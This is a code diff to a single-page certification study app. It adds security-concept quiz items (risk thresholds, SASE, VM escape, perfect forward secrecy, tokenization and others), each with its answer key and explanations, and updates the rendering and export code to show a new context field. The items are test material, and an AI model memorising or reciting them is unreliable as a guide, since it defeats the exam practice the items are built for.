+pre:"Risk governance excerpt:\nRisk appetite statement: 'The organization will not accept any risk with potential regulatory fines.'\nRisk threshold: Risks scoring above 15 (Likelihood x Impact) require executive sign-off.\nCurrent risk score: 18 - awaiting executive review before proceeding.",
+q:"Which term describes the '15' cutoff value that triggers mandatory executive sign-off?",
+c:["Risk threshold","Risk appetite","Risk tolerance","Risk register"],a:0,
+e:"A specific numeric cutoff point that automatically triggers an escalation action, like requiring executive sign-off, is the risk threshold - the line that converts a risk from routine to requiring attention.",
+w:["","Risk appetite is a broad statement about the overall amount and type of risk an organization is willing to pursue, not a specific numeric cutoff that triggers escalation.","Risk tolerance describes the acceptable range of variation around the appetite, not a hard trigger point requiring sign-off.","A risk register is the document used to track identified risks, not the numeric threshold value itself."]},
+
+{i:2414,d:5,o:"5.2",t:"s",g:"risk-appetite-conservative",
+pre:"Board resolution excerpt:\n'Given our stable market position, the organization will pursue only well-understood risks with predictable outcomes and will avoid speculative ventures.'",
+q:"Which risk appetite category does this statement reflect?",
+c:["Expansionary","Conservative","Neutral","Risk threshold"],a:1,
+e:"Deliberately avoiding speculative ventures in favor of only well-understood, predictable risk is the defining posture of a conservative risk appetite.",
+w:["Expansionary appetite means an organization is willing to pursue higher risk for higher reward or growth, the opposite of this statement's clear risk avoidance.","","A neutral appetite reflects a balanced stance with no strong lean either way, but this statement's explicit avoidance of speculative risk points more clearly toward a conservative stance.","A risk threshold is a specific numeric trigger point, not a general category describing an organization's overall appetite for risk."]},
+
+{i:2415,d:4,o:"4.7",t:"s",g:"automation-security-groups",
+pre:"Automation script log:\nNew EC2 instance launched via auto-scaling group\nScript automatically attaches security group 'web-tier-sg' (ports 80/443 only) based on the instance's tag\nNo manual firewall configuration performed",
+q:"Which automation use case does this log BEST represent?",
+c:["Ticket creation","User provisioning","Security groups (automated resource provisioning)","Continuous integration and testing"],a:2,
+e:"Automatically attaching the correct network security policy to a newly launched compute resource, based on a tag and with no manual step, is the security groups/resource provisioning automation use case.",
+w:["Ticket creation automatically opens a helpdesk or tracking ticket; it doesn't attach network policy to a compute resource.","User provisioning creates and manages user accounts, not infrastructure security group assignment on a launched server.","","Continuous integration and testing automates building and testing code, unrelated to attaching a security group to a newly launched instance."]},
+
+{i:2416,d:3,o:"3.2",t:"s",g:"utm-log",
+pre:"Security appliance log:\nSingle device performing: antivirus scanning, spam filtering, web content filtering, and stateful firewall inspection\nAll functions run on one unified management console",
+q:"Which type of appliance is described?",
+c:["Web application firewall (WAF)","Next-generation firewall (NGFW)","Intrusion prevention system (IPS)","Unified threat management (UTM)"],a:3,
+e:"Bundling antivirus, spam filtering, web filtering, and firewall inspection into a single device under one management console is the defining characteristic of a UTM appliance.",
+w:["A WAF specifically filters HTTP/web application traffic only, not the bundled antivirus, spam-filtering, web-filtering, and firewall suite shown here.","An NGFW adds application awareness and intrusion prevention to firewall functions but doesn't typically bundle antivirus and spam filtering the way a UTM does.","An IPS only performs intrusion detection and prevention, not the full bundled suite of functions described here.",""]},
+
+{i:2417,d:3,o:"3.2",t:"s",g:"sase-log",
+pre:"Remote worker connectivity report:\nUser connects from a coffee shop Wi-Fi network\nTraffic is routed through a cloud-delivered security stack (SWG, CASB, ZTNA, FWaaS) before reaching any destination\nNo traditional VPN concentrator or on-premises hardware involved",
+q:"Which architecture does this connectivity model describe?",
+c:["Secure access service edge (SASE)","SD-WAN","Traditional site-to-site VPN","Air-gapped network"],a:0,
+e:"Routing a remote user's traffic through a cloud-delivered bundle of security services (SWG, CASB, ZTNA, FWaaS) instead of on-premises VPN hardware is exactly what SASE consolidates.",
+w:["","SD-WAN focuses on optimizing and directing WAN traffic between sites, not bundling cloud-delivered security functions like SWG, CASB, and ZTNA for individual remote users.","A traditional site-to-site VPN connects two fixed network locations through on-premises hardware, the opposite of the cloud-delivered model described here.","An air-gapped network has no external connectivity at all, unrelated to a remote worker's cloud-routed traffic."]},
+
+{i:2418,d:2,o:"2.3",t:"s",g:"toc-tou-race-condition",
+pre:"Application vulnerability report:\nA file's permissions are checked at time T1 (check: read-only)\nBefore the file is actually opened at time T2, an attacker swaps it with a different, writable file\nThe application proceeds to operate on the swapped file believing its original permissions still apply",
+q:"Which vulnerability class does this describe?",
+c:["Buffer overflow","Time-of-check/time-of-use (TOC/TOU) race condition","Memory injection","Malicious update"],a:1,
+e:"Exploiting the timing gap between when a resource is checked and when it's actually used, by swapping the resource in between, is the definition of a TOC/TOU race condition.",
+w:["Buffer overflow involves writing past an allocated memory boundary, unrelated to a timing gap between checking and using a resource.","","Memory injection involves injecting and executing code into a running process's memory, not swapping a file between a check and its use.","A malicious update refers to a compromised legitimate software update, not a timing-based file-swap exploit."]},
+
+{i:2419,d:2,o:"2.3",t:"s",g:"vm-escape",
+pre:"Hypervisor security log:\nGuest virtual machine VM-07 executed a crafted instruction sequence\nProcess gained execution access to the underlying hypervisor's memory space\nOther guest VMs on the same host became accessible to the attacker",
+q:"Which vulnerability type does this log describe?",
+c:["Resource reuse","Side loading","VM escape","Jailbreaking"],a:2,
+e:"An attacker breaking out of a guest VM's isolation to reach the hypervisor and other guest VMs on the same host is the definition of VM escape.",
+w:["Resource reuse refers to residual data left behind in shared virtualized resources being exposed to a new tenant, not an attacker actively breaking out of a guest VM into the hypervisor.","Side loading involves installing an app from outside an official app store on a mobile device, unrelated to hypervisor security.","","Jailbreaking removes manufacturer restrictions on a mobile device, also unrelated to virtualization escape."]},
+
+{i:2420,d:1,o:"1.4",t:"s",g:"pfs-key-exchange",
+pre:"TLS session log:\nCipher suite negotiated: ECDHE-RSA-AES256-GCM-SHA384\nEach session generates a unique, temporary key exchange value\nCompromise of the server's long-term private key does NOT allow decryption of previously captured sessions",
+q:"Which cryptographic property does this negotiated cipher suite provide?",
+c:["Key escrow","Data masking","Steganography","Perfect forward secrecy"],a:3,
+e:"Generating a unique, temporary key for every session so that a later compromise of the long-term private key can't unlock past captured traffic is the definition of perfect forward secrecy, delivered here by the ephemeral Diffie-Hellman exchange (ECDHE).",
+w:["Key escrow is the practice of storing a copy of a private key with a trusted third party for recovery purposes, the opposite of the property being described here.","Data masking hides part of a displayed value, unrelated to a key exchange property in a TLS session.","Steganography hides data within other data, such as an image file, unrelated to a TLS key exchange method.",""]},
+
+{i:2421,d:4,o:"4.3",t:"s",g:"cvss-scoring",
+pre:"Vulnerability scan finding:\nCVE-2025-30144\nAttack vector: Network | Attack complexity: Low | Privileges required: None | User interaction: None\nCVSS Base Score: 9.8 (Critical)",
+q:"Which factor in this CVSS breakdown contributes MOST to the high severity score?",
+c:["The vulnerability is remotely exploitable with no authentication or user interaction required","The vulnerability requires physical access","The vulnerability requires administrator privileges to exploit","The vulnerability only affects legacy systems"],a:0,
+e:"A vulnerability reachable over the network, requiring no privileges and no user interaction, is about as easy as an exploit gets to trigger at scale, which is exactly why the combination of these low-barrier factors drives the score to critical.",
+w:["","Nothing in the breakdown indicates physical access is required.","The log explicitly states 'Privileges required: None', the opposite of requiring administrator privileges.","Nothing in this CVSS breakdown references the age or platform of affected systems."]},
+
+{i:2422,d:4,o:"4.4",t:"s",g:"soar-playbook",
+pre:"Security orchestration log:\nAlert received: Phishing email reported by user\nAutomated playbook executed: extracted URL, submitted to sandbox, checked against threat intel feeds, and auto-quarantined the email from all mailboxes\nTotal time from alert to containment: 45 seconds, no analyst involvement",
+q:"Which technology executed this automated, multi-step response?",
+c:["SIEM","SOAR","DLP","NAC"],a:1,
+e:"Chaining together multiple automated actions (sandboxing a URL, checking threat intel, quarantining an email) into one orchestrated response with no analyst involvement is exactly what SOAR (Security Orchestration, Automation, and Response) is built to do.",
+w:["A SIEM aggregates and correlates log data to generate alerts, but it doesn't typically execute multi-step automated response playbooks on its own.","","DLP focuses on preventing sensitive data from leaving the organization, not orchestrating an incident response workflow.","NAC controls network admission for devices, unrelated to automating an email-based incident response."]},
+
+{i:2423,d:4,o:"4.3",t:"s",g:"threat-feed-osint",
+pre:"Threat intelligence log:\nIndicator: IP address 203.0.113.77 flagged as a known C2 server\nSource: Publicly available malware tracking website, freely accessible without a subscription\nNo vendor relationship or paid contract involved",
+q:"Which type of threat feed provided this indicator?",
+c:["Proprietary/third-party feed","Dark web monitoring","Open-source intelligence (OSINT)","Information-sharing organization feed"],a:2,
+e:"A freely accessible public source requiring no subscription or vendor contract is open-source intelligence - threat data gathered from publicly available resources.",
+w:["A proprietary/third-party feed requires a paid vendor relationship or subscription, which this source explicitly does not have.","Dark web monitoring involves gathering intelligence from hidden, non-indexed criminal marketplaces and forums, not a freely accessible public tracking website.","","An information-sharing organization feed comes from a formal industry consortium, such as an ISAC, not an open public website with no membership."]},
+
+{i:2424,d:5,o:"5.5",t:"s",g:"pentest-integrated",
+pre:"Engagement scope document:\nTeam A actively attempts to breach the network and exfiltrate a test file (the 'crown jewels' exercise)\nTeam B simultaneously monitors detection tools and attempts to identify and stop Team A in real time\nBoth teams report findings together afterward",
+q:"Which type of exercise does this engagement describe?",
+c:["Known environment testing only","Passive reconnaissance only","Unknown environment testing only","Integrated (offensive and defensive combined)"],a:3,
+e:"Running an active attack team and a simultaneous defensive detection team together, then reporting jointly, is an integrated exercise, combining both offensive and defensive perspectives.",
+w:["Known/unknown environment describes how much internal information the testers were given, a separate concept from whether attack and defense are combined.","Passive reconnaissance is a specific information-gathering phase, not a description of running simultaneous attack and defense teams.","Unknown environment testing also only addresses tester knowledge level, not the combined offense/defense structure described here.",""]},
+
+{i:2425,d:4,o:"4.6",t:"s",g:"rbac-log",
+pre:"Access control log:\nUser 'jsmith' assigned to role 'Billing Clerk'\nRole 'Billing Clerk' grants: read/write to invoicing system, read-only to customer records\nPermissions changed automatically when jsmith's role was updated to 'Billing Manager'",
+q:"Which access control model is illustrated by this log?",
+c:["Role-based access control (RBAC)","Discretionary access control (DAC)","Mandatory access control (MAC)","Attribute-based access control (ABAC)"],a:0,
+e:"Permissions are tied to a defined job role, and they update automatically the moment the role changes, which is the defining behavior of role-based access control.",
+w:["","DAC lets individual resource owners grant access at their own discretion, not permissions tied to a formally defined role.","MAC assigns access based on fixed security labels or clearance levels set by a central authority, not job-title-based roles.","ABAC evaluates a combination of attributes (user, resource, environment) dynamically, rather than a single assigned role determining a fixed permission set."]},
+
+{i:2426,d:4,o:"4.6",t:"s",g:"time-of-day-restriction",
+pre:"Access control policy log:\nUser account 'contractor_kim' permitted to authenticate only between 08:00 and 18:00 local time\nLogin attempt at 23:14 was automatically denied, account not locked",
+q:"Which access control concept is being enforced?",
+c:["Least privilege","Time-of-day restrictions","Attribute-based access control","Mandatory access control"],a:1,
+e:"Restricting authentication to a specific window of hours, and denying (without locking) attempts outside that window, is a time-of-day restriction.",
+w:["Least privilege limits what an authenticated user can do once inside a system, not when they're allowed to log in at all.","","Attribute-based access control evaluates multiple combined attributes to make a decision, whereas this policy is a simple fixed time window.","Mandatory access control assigns access based on security labels or clearance, unrelated to a time-of-day login window."]},
+
+{i:2427,d:1,o:"1.4",t:"s",g:"tokenization-vault",
+pre:"Payment processing log:\nOriginal card number 4111111111111111 replaced everywhere in the merchant's database with token 'tok_9f83ad2e'\nThe original card number is stored only in a separate, highly secured vault, retrievable only by the payment processor",
+q:"Which data protection technique does this represent?",
+c:["Data masking","Hashing","Tokenization","Steganography"],a:2,
+e:"Replacing the real value everywhere it's stored with a substitute token, while keeping the original recoverable only through a separate secure vault, is the defining pattern of tokenization.",
+w:["Data masking would show a partially obscured version of the real value, like the last four digits, rather than a completely unrelated substitute token stored in a separate vault.","Hashing produces a fixed, irreversible digest and does not require a separate vault to retrieve the original value, since a hash cannot be reversed back to the original.","","Steganography hides data within other data, such as an image file, unrelated to replacing a card number with a reference token."]},
+
+{i:2428,d:5,o:"5.3",t:"s",g:"vendor-right-to-audit",
+pre:"Vendor contract clause:\n'Customer reserves the right to conduct on-site security assessments of Vendor's data center facilities with 30 days' written notice, up to twice annually.'",
+q:"Which vendor assessment mechanism does this clause establish?",
+c:["Non-disclosure agreement (NDA)","Service-level agreement (SLA)","Business partners agreement (BPA)","Right-to-audit clause"],a:3,
+e:"A contractual provision allowing the customer to physically inspect and assess a vendor's facilities is a right-to-audit clause, distinct from confidentiality, performance, or partnership terms.",
+w:["An NDA covers confidentiality of shared information, not the right to physically inspect a vendor's facilities.","An SLA defines measurable performance commitments like uptime, not audit access rights.","A BPA establishes general partnership terms, not this specific audit-access provision.",""]},
+
+{i:2429,d:5,o:"5.4",t:"s",g:"right-to-be-forgotten",
+pre:"Privacy request log:\nData subject submitted a formal request under applicable privacy law to have all personal data associated with their account permanently deleted\nCompany privacy team confirmed deletion across all systems, including backups, within the required timeframe",
+q:"Which privacy concept does this request represent?",
+c:["Right to be forgotten","Data sovereignty","Data classification","Attestation"],a:0,
+e:"An individual formally requesting the permanent deletion of their personal data, and the organization complying across all systems including backups, is the right to be forgotten in action.",
+w:["","Data sovereignty concerns which country's laws govern data based on its physical location, not an individual's right to request deletion.","Data classification is the process of labeling data by sensitivity level, unrelated to a deletion request.","Attestation is a formal confirmation or sign-off on a control, not the underlying privacy right being exercised here."]},
+
+{i:2430,d:3,o:"3.4",t:"s",g:"tabletop-exercise",
+pre:"Business continuity activity log:\nParticipants: IT director, legal counsel, communications lead, CEO\nScenario discussed verbally in a conference room: 'Ransomware encrypts the primary data center - walk through your response'\nNo systems were actually taken offline or tested",
+q:"Which type of resilience testing does this activity represent?",
+c:["Simulation","Tabletop exercise","Parallel processing","Failover test"],a:1,
+e:"A purely verbal, discussion-based walkthrough of a scenario, with no systems actually touched, is a tabletop exercise - the lowest-friction way to rehearse a response plan.",
+w:["A simulation typically involves a more realistic, hands-on run-through that may include mimicking actual system behavior, beyond a purely verbal discussion.","","Parallel processing runs production and backup systems simultaneously to validate output consistency, not a discussion-based walkthrough.","A failover test actually shifts operations to a backup system, which explicitly did not happen here."]},
+
+{i:2431,d:4,o:"4.6",t:"s",g:"password-vaulting",
+pre:"Privileged access management log:\nAdministrator requests the credential for the root database account\nPAM system retrieves the password from a secure vault, displays it once, and automatically rotates it to a new value immediately after use",
+q:"Which PAM concept does this log demonstrate?",
+c:["Federation","Single sign-on","Password vaulting","Attestation"],a:2,
+e:"Centrally storing a shared privileged credential in a secure vault, releasing it on request, and automatically rotating it after use is password vaulting.",
+w:["Federation allows identities from one trusted domain to access resources in another, unrelated to centrally storing and rotating a single shared credential.","Single sign-on lets one authentication event grant access to multiple applications, a different concept from retrieving and rotating a vaulted password.","","Attestation is a formal confirmation or sign-off on a control, not the mechanism of storing and rotating a credential."]},
+
+{i:2432,d:4,o:"4.9",t:"s",g:"vulnerability-scan-datasource",
+pre:"Investigation data request:\nAnalyst needs to determine whether a specific internal server was known to be missing a critical patch BEFORE last week's breach occurred\nHistorical scan data from three months of automated weekly scans is available",
+q:"Which data source would BEST answer this question?",
+c:["Packet captures","Dashboards","Automated reports (real-time only)","Vulnerability scans"],a:3,
+e:"Historical vulnerability scan records, run weekly over three months, are exactly the data source that would show whether a specific patch was missing on a specific server before a given date.",
+w:["Packet captures record network traffic at the packet level, not historical patch or vulnerability status of a server.","Dashboards typically show current or summarized state rather than a specific historical scan result from a particular week.","Automated reports limited to real-time data wouldn't contain the three months of historical scan history needed to answer a question about the server's status before the breach.",""]},
+
+];
+
+const QUESTIONS=Q1.concat(Q2).concat(Q3).concat(Q4).concat(Q5).concat(Q6).concat(Q7).concat(Q8).concat(Q9).concat(Q10).concat(Q11).concat(Q12).concat(Q13).concat(Q14).concat(Q15).concat(Q16).concat(Q17).concat(Q18).concat(Q19).concat(Q20);
 ACR.forEach(a=>{ if(!a.u && EXTRA_U[a.a]) a.u=EXTRA_U[a.a]; });
 function allCards(){ CARDS.forEach((cd,i)=>{ if(cd.id===undefined) cd.id=i; }); return CARDS.concat(S.customCards||[]); }
 function cardById(id){ if(id<100000) return CARDS[id]; return (S.customCards||[]).find(x=>x.id===id) || {f:"(removed)",b:"",d:0,o:"",g:"",id:id}; }
@@ -7991,7 +8711,7 @@ function reportBtn(type,id){
   return `<button class="btn ghost sm rpt-btn" data-type="${esc(type)}" data-id="${esc(String(id))}" style="color:${already?"var(--dim)":"var(--red)"};border-color:${already?"var(--line)":"var(--red)"}" ${already?"disabled":""} onclick="reportIssue(this.dataset.type,this.dataset.id)">${already?"\u2691 Flagged":"\u2690 Flag"}</button>`;
 }
 function reportSnippet(r){
-  if(r.type==="question"){ const q=qById(parseInt(r.id,10)); if(!q) return "Question #"+r.id+" (no longer exists)"; return "Question #"+q.i+" [D"+q.d+" "+q.o+", "+q.g+"]\nQ: "+q.q+"\nChoices: "+q.c.join(" | ")+"\nCorrect: "+q.c[q.a]; }
+  if(r.type==="question"){ const q=qById(parseInt(r.id,10)); if(!q) return "Question #"+r.id+" (no longer exists)"; return "Question #"+q.i+" [D"+q.d+" "+q.o+", "+q.g+"]\n"+(q.pre?"Context:\n"+q.pre+"\n":"")+"Q: "+q.q+"\nChoices: "+q.c.join(" | ")+"\nCorrect: "+q.c[q.a]; }
   if(r.type==="card"){ const c=cardById(parseInt(r.id,10)); if(!c) return "Flashcard #"+r.id+" (no longer exists)"; return "Flashcard #"+c.id+" [D"+c.d+" "+c.o+", "+c.g+"]\nFront: "+c.f+"\nBack: "+c.b; }
   if(r.type==="pbq"){ const p=PBQ.find(x=>x.id===parseInt(r.id,10)); if(!p) return "PBQ #"+r.id+" (no longer exists)"; return "PBQ #"+p.id+" ["+p.t+", D"+p.d+" "+p.o+"] \""+p.title+"\""; }
   if(r.type==="acronym"){ const a=acrU().find(x=>x.a===r.id); if(!a) return "Acronym "+r.id+" (no longer exists)"; return "Acronym "+a.a+" = "+a.d+" ["+a.g+"]\n"+a.u; }
@@ -8445,7 +9165,7 @@ function renderTicket(done,chosen){
   <div class="ticket">
     <div class="thead"><span class="sev ${sv}">${sv.toUpperCase()}</span>
       <span>TKT-${String(1000+q.i)}</span><span>Domain ${q.d}.0</span><span>Obj ${q.o}</span><span>${typeLabel}</span>${reportBtn("question",q.i)}</div>
-    <div class="tbody"><p class="qtext">${esc(q.q)}</p></div>
+    <div class="tbody">${q.pre?`<pre class="pbqpre">${esc(q.pre)}</pre>`:""}<p class="qtext">${esc(q.q)}</p></div>
     <div class="opts">${opts}</div>
   </div>
   <div id="fb"></div>`;
@@ -8544,7 +9264,7 @@ function renderDrill(done,chosen){
     <span class="dim mono" style="font-size:12px;letter-spacing:.1em;text-transform:uppercase">streak ${sess.streak} &nbsp;/&nbsp; item ${sess.i}</span>
   </div>
   <div class="ticket"><div class="thead"><span>Domain ${q.d}.0</span><span>Obj ${q.o}</span>${reportBtn("question",q.i)}</div>
-    <div class="tbody"><p class="qtext">${esc(q.q)}</p></div><div class="opts">${opts}</div></div>
+    <div class="tbody">${q.pre?`<pre class="pbqpre">${esc(q.pre)}</pre>`:""}<p class="qtext">${esc(q.q)}</p></div><div class="opts">${opts}</div></div>
   ${done?"":`<div class="row" style="margin-top:14px"><button class="btn ghost sm" onclick="drillReport()">Stop</button></div>`}
   <div id="fb"></div>`;
 }
@@ -9567,7 +10287,7 @@ function examRender(){
     const q=qById(it.id), ord=SX.orders[it.id];
     const revealed=SX.checkMode&&SX.checked&&SX.checked[it.id];
     const pick=SX.answers[it.id];
-    body=`<h1 style="font-size:19px;line-height:1.5">${esc(q.q)}</h1>
+    body=`${q.pre?`<pre class="pbqpre">${esc(q.pre)}</pre>`:""}<h1 style="font-size:19px;line-height:1.5">${esc(q.q)}</h1>
     <div class="opts">${ord.map((oi,pos)=>{
       let cls=pick===oi?"picked":"";
       if(revealed){
@@ -9733,7 +10453,7 @@ function examReview(){
       const q=qById(d.id), ord=SX.orders[d.id]||[0,1,2,3];
       items+=`<div class="card rvq ${d.ok?"":"rvmiss"}">
         <div class="mono" style="font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:${d.ok?"var(--green)":"var(--red)"}">Item ${ix+1} \u00b7 ${d.ok?"Correct":(d.pick===undefined?"Unanswered":"Missed")} \u00b7 D${q.d} \u00b7 obj ${q.o}</div>
-        <p style="margin:8px 0 10px;font-weight:600">${esc(q.q)}</p>
+        ${q.pre?`<pre class="pbqpre">${esc(q.pre)}</pre>`:""}<p style="margin:8px 0 10px;font-weight:600">${esc(q.q)}</p>
         ${ord.map(oi=>{
           const cls=oi===q.a?"correct":(d.pick===oi?"wrong":"");
           return `<div class="opt rv ${cls}"><span>${esc(expandIfAcronym(q.c[oi]))}${oi===q.a?' <span class="ct" style="color:var(--green)">(correct)</span>':""}${d.pick===oi&&oi!==q.a?' <span class="ct" style="color:var(--red)">(your pick)</span>':""}</span></div>`;
@@ -9801,7 +10521,7 @@ function examExport(fmt){
   if(fmt==="json"){
     const items=r.detail.map(d=>{
       if(d.t==="q"){ const q=qById(d.id);
-        return {type:"question",domain:q.d,objective:q.o,concept:q.g,question:q.q,
+        return {type:"question",domain:q.d,objective:q.o,concept:q.g,context:q.pre||undefined,question:q.q,
           correctAnswer:q.c[q.a],yourAnswer:d.pick!==undefined?q.c[d.pick]:null,correct:d.ok,why:q.e};
       } else { const p=PBQ.find(z=>z.id===d.id);
         if(!p) return {type:"pbq",note:"No longer available",score:d.pct,points:d.got+"/"+d.total};
@@ -9835,6 +10555,7 @@ function examExport(fmt){
       if(d.t==="q"){
         const q=qById(d.id);
         L.push((ix+1)+". ["+ (d.ok?"CORRECT":(d.pick===undefined?"UNANSWERED":"MISSED")) +"] Domain "+q.d+".0, objective "+q.o+", concept: "+q.g.replace(/-/g," "));
+        if(q.pre) L.push("   Context:\n"+q.pre.split("\n").map(x=>"     "+x).join("\n"));
         L.push("   Q: "+q.q);
         L.push("   Correct answer: "+q.c[q.a]);
         if(!d.ok) L.push("   Your answer: "+(d.pick!==undefined?q.c[d.pick]:"(unanswered)"));
@@ -9868,7 +10589,7 @@ function examExportAll(fmt){
           });
           const items=at.detail.map(d=>{
             if(d.t==="q"){ const q=qById(d.id);
-              return {type:"question",domain:q.d,objective:q.o,concept:q.g,question:q.q,
+              return {type:"question",domain:q.d,objective:q.o,concept:q.g,context:q.pre||undefined,question:q.q,
                 correctAnswer:q.c[q.a],yourAnswer:d.pick!==undefined?q.c[d.pick]:null,correct:d.ok,why:q.e};
             } else { const p=PBQ.find(z=>z.id===d.id);
               if(!p) return {type:"pbq",note:"No longer available",score:d.pct,points:d.got+"/"+d.total};
@@ -9923,6 +10644,7 @@ function examExportAll(fmt){
         misses.forEach(d=>{
           if(d.t==="q"){ const q=qById(d.id);
             L.push("- [Domain "+q.d+".0, objective "+q.o+", "+q.g.replace(/-/g," ")+"]");
+            if(q.pre) L.push("  Context:\n"+q.pre.split("\n").map(x=>"    "+x).join("\n"));
             L.push("  Q: "+q.q);
             L.push("  Correct answer: "+q.c[q.a]);
             L.push("  Your answer: "+(d.pick!==undefined?q.c[d.pick]:"(unanswered)"));
@@ -10154,6 +10876,7 @@ function exportMissesToAI(){
   sess.misses.forEach((q,ix)=>{
     L.push("");
     L.push("### "+(ix+1)+". "+q.g.replace(/-/g," ")+" (Domain "+q.d+".0, objective "+q.o+")");
+    if(q.pre) L.push("**Context:**\n```\n"+q.pre+"\n```");
     L.push("**Question I missed:** "+q.q);
     L.push("**Correct answer:** "+q.c[q.a]);
     L.push("**Why:** "+q.e);
@@ -10225,6 +10948,7 @@ function coachBrief(){
     missedQ.forEach((q,n)=>{
       L.push("");
       L.push((n+1)+". [Domain "+q.d+".0, objective "+q.o+", concept: "+q.g.replace(/-/g," ")+"] missed "+S.qStat[q.i].m+"x");
+      if(q.pre) L.push("   Context:\n"+q.pre.split("\n").map(x=>"     "+x).join("\n"));
       L.push("   Q: "+q.q);
       L.push("   Correct answer: "+q.c[q.a]);
       L.push("   Why: "+q.e);
@@ -10348,3 +11072,5 @@ document.addEventListener("click",e=>{
 },true);
 load().then(()=>{ applyTheme(); if(!S.exam&&!S.name) profile(true); else home(); });
 </script>
+</body>
+</html>
